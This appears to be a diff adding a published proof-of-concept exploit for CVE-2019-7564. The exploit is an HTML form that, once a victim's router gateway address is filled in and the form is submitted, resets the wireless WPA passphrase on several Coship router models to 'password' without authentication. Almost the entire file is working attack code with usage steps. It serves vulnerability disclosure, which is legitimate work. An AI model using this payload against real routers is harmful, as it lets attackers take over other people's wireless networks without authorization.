@@ -1,0 +1,35 @@
+# Exploit Title: Coship Wireless Router – Wireless SSID Unauthenticated Password Reset
+# Date: 07.02.2019
+# Exploit Author: Adithyan AK
+# Vendor Homepage: http://en.coship.com/
+# Category: Hardware (WiFi Router)
+# Affected Versions *: *Coship RT3052 - 4.0.0.48, Coship RT3050 - 4.0.0.40, Coship WM3300 - 5.0.0.54, Coship WM3300 - 5.0.0.55, Coship RT7620 - 10.0.0.49.
+# Tested on: MacOS Mojave v.10.14
+# CVE: CVE-2019-7564
+
+#POC :
+
+# Change the X.X.X.X in poc to Router Gateway address and save the below code as Exploit.html
+# Open Exploit.html with your Browser
+# Click on “Submit request”
+# The password of the Wireless SSID will be changed to "password"
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://X.X.X.X/regx/wireless/wl_security_2G.asp
+<http://router-ip/regx/wireless/wl_security_2G.asp>" method="POST">
+      <input type="hidden" name="wl&#95;wep" value="disabled" />
+      <input type="hidden" name="wl&#95;auth&#95;mode" value="none" />
+      <input type="hidden" name="page" value="wl&#95;security&#95;2G&#46;asp" />
+      <input type="hidden" name="wl&#95;unit" value="0" />
+      <input type="hidden" name="action" value="Apply" />
+      <input type="hidden" name="wl&#95;auth" value="0" />
+      <input type="hidden" name="wl&#95;akm" value="psk&#32;psk2" />
+      <input type="hidden" name="wl&#95;crypto" value="tkip&#43;aes" />
+      <input type="hidden" name="wl&#95;wpa&#95;gtk&#95;rekey" value="0" />
+      <input type="hidden" name="wl&#95;wpa&#95;psk" value="password" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
